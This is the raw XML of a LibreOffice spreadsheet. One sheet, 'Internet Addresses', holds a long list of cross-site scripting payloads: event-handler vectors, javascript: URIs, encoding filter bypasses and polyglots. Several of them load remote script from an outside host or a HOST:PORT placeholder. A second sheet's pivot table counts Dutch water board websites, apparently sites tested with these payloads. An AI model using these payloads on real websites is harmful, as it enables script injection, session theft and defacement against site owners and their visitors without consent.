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76.2pt"/>
    </style:style>
    <style:style style:name="co5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6.95pt"/>
    </style:style>
    <style:style style:name="co7" style:family="table-column">
      <style:table-column-properties fo:break-before="auto" style:column-width="166.7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6pt" fo:break-before="auto" style:use-optimal-row-height="false"/>
    </style:style>
    <style:style style:name="ro4" style:family="table-row">
      <style:table-row-properties style:row-height="23.3pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro5" style:family="table-row">
      <style:table-row-properties style:row-height="23.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34.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro8" style:family="table-row">
      <style:table-row-properties style:row-height="56.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro9" style:family="table-row">
      <style:table-row-properties style:row-height="68.26pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro10" style:family="table-row">
      <style:table-row-properties style:row-height="57.26pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro11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ernet Addresses" table:style-name="ta1">
        <table:table-column table:style-name="co6" table:default-cell-style-name="Default"/>
        <table:table-column table:style-name="co7" table:default-cell-style-name="ce6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Internet Address</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" table:number-columns-repeated="1022"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce25" office:value-type="string" calcext:value-type="string">
            <text:p>&lt;svg onload=alert(1)&gt;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"&gt;&lt;svg onload=alert(1)//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"onmouseover=alert(1)//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"autofocus/onfocus=alert(1)//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'-alert(1)-'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'-alert(1)//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\'-alert(1)//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/script&gt;&lt;svg onload=alert(1)&gt;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&lt;x contenteditable onblur=alert(1)&gt;lose focus! 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click=alert(1)&gt;click this! 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copy=alert(1)&gt;copy this! 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oncontextmenu=alert(1)&gt;right click this! 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cut=alert(1)&gt;copy this! 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ondblclick=alert(1)&gt;double click this! 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drag=alert(1)&gt;drag this! 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contenteditable onfocus=alert(1)&gt;focus this! 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contenteditable oninput=alert(1)&gt;input here! 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x contenteditable onkeydown=alert(1)&gt;press any key! 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7">
          <table:table-cell table:style-name="ce25" office:value-type="string" calcext:value-type="string">
            <text:p>&lt;x contenteditable onkeypress=alert(1)&gt;press any key! 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contenteditable onkeyup=alert(1)&gt;press any key! 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onmousedown=alert(1)&gt;click this! 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onmousemove=alert(1)&gt;hover this! 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onmouseout=alert(1)&gt;hover this! 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onmouseover=alert(1)&gt;hover this! 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onmouseup=alert(1)&gt;click this! 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x contenteditable onpaste=alert(1)&gt;paste here!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script&gt;alert(1)// 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script&gt;alert(1)&lt;!–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script src=//brutelogic.com.br/1.js&gt; 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script src=//3334957647/1&gt;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%3Cx onxxx=alert(1) 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%78 onxxx=1 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%6Fnxxx=1 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%6Exxx=1 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%78xx=1 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xxx%3D1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xxx=1 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Xxx=1 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Xxx=1 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xxx=1 onxxx=1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/onxxx=1 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%09onxxx=1 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%0Aonxxx=1 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%0Conxxx=1 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%0Donxxx=1 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%2Fonxxx=1 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1='1'onxxx=1 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1="1"onxxx=1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&lt;/onxxx=1 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1="&gt;" onxxx=1 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http://onxxx%3D1/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x onxxx=alert(1) 1='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8">
          <table:table-cell table:style-name="ce25" office:value-type="string" calcext:value-type="string">
            <text:p>&lt;svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)&gt;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'onload=alert(1)&gt;&lt;svg/1='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'&gt;alert(1)&lt;/script&gt;&lt;script/1=' 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*/alert(1)&lt;/script&gt;&lt;script&gt;/*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*/alert(1)"&gt;'onload="/*&lt;svg/1='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`-alert(1)"&gt;'onload="`&lt;svg/1='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*/&lt;/script&gt;'&gt;alert(1)/*&lt;script/1='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script&gt;alert(1)&lt;/script&gt; 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script src=javascript:alert(1)&gt; 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iframe src=javascript:alert(1)&gt; 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embed src=javascript:alert(1)&gt; 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a href=javascript:alert(1)&gt;click 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math&gt;&lt;brute href=javascript:alert(1)&gt;click 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form action=javascript:alert(1)&gt;&lt;input type=submit&gt; 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isindex action=javascript:alert(1) type=submit value=click&gt; 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form&gt;&lt;button formaction=javascript:alert(1)&gt;click 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form&gt;&lt;input formaction=javascript:alert(1) type=submit value=click&gt; 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form&gt;&lt;input formaction=javascript:alert(1) type=image value=click&gt; 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form&gt;&lt;input formaction=javascript:alert(1) type=image src=SOURCE&gt; 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isindex formaction=javascript:alert(1) type=submit value=click&gt; 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object data=javascript:alert(1)&gt; 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iframe srcdoc=&lt;svg/o&amp;#x6Eload&amp;equals;alert&amp;lpar;1)&amp;gt;&gt; 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svg&gt;&lt;script xlink:href=data:,alert(1) /&gt; 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7">
          <table:table-cell table:style-name="ce25" office:value-type="string" calcext:value-type="string">
            <text:p>&lt;math&gt;&lt;brute xlink:href=javascript:alert(1)&gt;click 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9">
          <table:table-cell table:style-name="ce25" office:value-type="string" calcext:value-type="string">
            <text:p>&lt;svg&gt;&lt;a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?&gt;&lt;circle r=400 /&gt;&lt;animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&amp;&gt;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html ontouchstart=alert(1)&gt; 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html ontouchend=alert(1)&gt; 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html ontouchmove=alert(1)&gt; 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html ontouchcancel=alert(1)&gt;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body onorientationchange=alert(1)&gt;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"&gt;&lt;img src=1 onerror=alert(1)&gt;.gif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10">
          <table:table-cell table:style-name="ce25" office:value-type="string" calcext:value-type="string">
            <text:p>&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/&gt;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GIF89a/*&lt;svg/onload=alert(1)&gt;*/=alert(document.domain)//;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script src="data:&amp;comma;alert(1)//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"&gt;&lt;script src=data:&amp;comma;alert(1)//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script src="//brutelogic.com.br&amp;sol;1.js&amp;num; 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"&gt;&lt;script src=//brutelogic.com.br&amp;sol;1.js&amp;num; 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11">
          <table:table-cell table:style-name="ce25" office:value-type="string" calcext:value-type="string">
            <text:p>&lt;link rel=import href="data:text/html&amp;comma;&amp;lt;script&amp;gt;alert(1)&amp;lt;&amp;sol;script&amp;gt; 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"&gt;&lt;link rel=import href=data:text/html&amp;comma;&amp;lt;script&amp;gt;alert(1)&amp;lt;&amp;sol;script&amp;gt;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base href=//0&gt;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script/src="data:&amp;comma;eval(atob(location.hash.slice(1)))//#alert(1)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body onload=alert(1)&gt;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body onpageshow=alert(1)&gt;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body onfocus=alert(1)&gt;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body onhashchange=alert(1)&gt;&lt;a href=#x&gt;click this!#x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body style=overflow:auto;height:1000px onscroll=alert(1) id=x&gt;#x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body onscroll=alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;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br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;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br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;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br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;x id=x&gt;#x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body onresize=alert(1)&gt;press F12!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body onhelp=alert(1)&gt;press F1! (MSIE)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marquee onstart=alert(1)&gt;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marquee loop=1 width=0 onfinish=alert(1)&gt;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audio src onloadstart=alert(1)&gt;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video onloadstart=alert(1)&gt;&lt;source&gt;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&lt;input autofocus onblur=alert(1)&gt;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keygen autofocus onfocus=alert(1)&gt;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form onsubmit=alert(1)&gt;&lt;input type=submit&gt;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6">
          <table:table-cell table:style-name="ce25" office:value-type="string" calcext:value-type="string">
            <text:p>&lt;select onchange=alert(1)&gt;&lt;option&gt;1&lt;option&gt;2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&lt;menu id=x contextmenu=x onshow=alert(1)&gt;right click me!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uiderzeeland.nl</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="1022"/>
        </table:table-row>
      </table:table>
      <table:table table:name="Statistics" table:style-name="ta1">
        <table:table-column table:style-name="co4" table:default-cell-style-name="ce29"/>
        <table:table-column table:style-name="co5" table:default-cell-style-name="ce33"/>
        <table:table-column table:style-name="co3" table:number-columns-repeated="2" table:default-cell-style-name="Default"/>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce27" office:value-type="string" calcext:value-type="string">
            <text:p>Category / List</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce31" office:value-type="string" calcext:value-type="string">
            <text:p>Count - Website</text:p>
          </table:table-cell>
          <table:table-cell/>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>To Reload: right click the table and choose “refresh”</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce28" office:value-type="string" calcext:value-type="string">
            <text:p>adw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empty)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce34"/>
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce30" office:value-type="string" calcext:value-type="string">
            <text:p>Total Result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2"/>
        </table:table-row>
      </table:table>
      <table:named-expressions>
        <table:named-range table:name="data" table:base-cell-address="$'Internet Addresses'.$B$1" table:cell-range-address="$'Internet Addresses'.$A$1:.$B$1048576"/>
      </table:named-expressions>
      <table:data-pilot-tables>
        <table:data-pilot-table table:name="DataPilot1" table:application-data="" table:target-range-address="Statistics.A1:Statistics.B7" table:buttons="Statistics.A1" table:show-filter-button="false" table:drill-down-on-double-click="false">
          <table:source-cell-range table:name="data" table:cell-range-address="'Internet Addresses'.A1:'Internet Addresses'.B1048576"/>
          <table:data-pilot-field table:source-field-name="Category / List" table:orientation="row" table:used-hierarchy="0" table:function="auto">
            <table:data-pilot-level table:show-empty="false" calcext:repeat-item-labels="false">
              <table:data-pilot-members>
                <table:data-pilot-member table:name="waterschappen" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="waterschappen, testsit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bsite" table:orientation="data" table:used-hierarchy="0" table:function="count">
            <table:data-pilot-level table:show-empty="false" calcext:repeat-item-labels="false">
              <table:data-pilot-members>
                <table:data-pilot-member table:name="aaenmaas.nl" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="agv.nl, www.agv.nl" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="brabantsedelta.nl" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="dommel.nl" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="hdsr.nl" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="hhdelfland.nl" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="hhnk.nl" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="hunzeenaas.nl" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="noorderzijlvest.nl" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="rijnland.net" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="scheldestromen.nl" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="schielandenkrimenerwaard.nl" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="uvw.nl, waterschappen.nl" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="vallei-veluwe.nl" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="vechtstromen.nl" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="waterschaplimburg.nl" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="waterschaprivierenland.nl" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="wdodelta.nl" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="wetterskipfryslan.nl" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="wrij.nl" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="wshd.nl" table:display="true" table:show-details="true"/>
                <table:data-pilot-member table:name="zuiderzeeland.n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3:43:28.515038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1T13:44:24.713088964</dc:date>
    <meta:editing-duration>PT12M51S</meta:editing-duration>
    <meta:editing-cycles>7</meta:editing-cycles>
    <meta:generator>LibreOffice/6.1.1.2$MacOSX_X86_64 LibreOffice_project/5d19a1bfa650b796764388cd8b33a5af1f5baa1b</meta:generator>
    <meta:document-statistic meta:table-count="2" meta:cell-count="371" meta:object-count="0"/>
  </office:meta>
</office:document-meta>
</file>